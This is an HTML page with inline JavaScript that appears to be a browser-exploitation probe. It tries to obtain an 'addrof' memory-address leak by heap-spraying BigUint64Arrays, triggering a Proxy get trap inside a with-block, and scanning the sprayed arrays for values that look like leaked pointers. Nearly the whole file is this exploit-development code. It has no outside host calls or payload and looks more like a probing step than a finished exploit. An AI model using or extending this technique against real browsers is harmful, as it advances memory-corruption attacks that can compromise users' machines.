<!DOCTYPE html>
<html>
<head>
    <title>addrof Detection via BigUint64Array</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting addrof detection test...");

            // Controlled object we want to find the address of
            const victim = { val: 13.37 };

            // Heap spray with BigUint64Arrays to increase chance of adjacency
            const sprayCount = 2000;
            let spray = [];
            for (let i = 0; i < sprayCount; i++) {
                spray.push(new BigUint64Array(4));
            }

            // Add victim near sprayed arrays
            spray.push(victim);
            spray.push(new BigUint64Array(10));

            // Set up Proxy trap to touch internal scopes
            let callCount = 0;

            const handler = {
                get(target, prop, receiver) {
                    if (callCount++ > 5) return undefined;
                    log("Proxy 'get' called (" + callCount + ")");
                    log("prop = " + prop);

                    // Try to inspect receiver deeply
                    try {
                        for (let key in receiver) {
                            try {
                                const val = receiver[key];
                                log(`receiver.${key} = ${typeof val} (${val})`);
                            } catch (e) {
                                log(`Error reading receiver.${key}: ${e.message}`);
                            }
                        }
                    } catch (e) {
                        log("Error enumerating receiver keys: " + e.message);
                    }

                    return Reflect.get(...arguments);
                }
            };

            const proxy = new Proxy(victim, handler);

            (function () {
                with (proxy) {
                    try {
                        log("Accessing 'toString'...");
                        toString();
                    } catch (e) {
                        log("Exception in with-block: " + e.message);
                    }
                }
            })();

            // Scan sprayed arrays for leaked pointers
            log("Scanning for leaked pointers...");
            for (let arr of spray) {
                if (arr instanceof BigUint64Array) {
                    for (let i = 0; i < arr.length; i++) {
                        let val = arr[i];
                        if (val > 0x1000 && val < BigInt("0x800000000000")) {
                            log(`Possible leaked pointer at arr[${i}] = 0x${val.toString(16)}`);
                        }
                    }
                }
            }
        };
    </script>
</head>
<body>
    <h2>addrof Detection Test</h2>
    <p>Trying to detect leaked pointers using BigUint64Array heap spraying.</p>
</body>
</html>
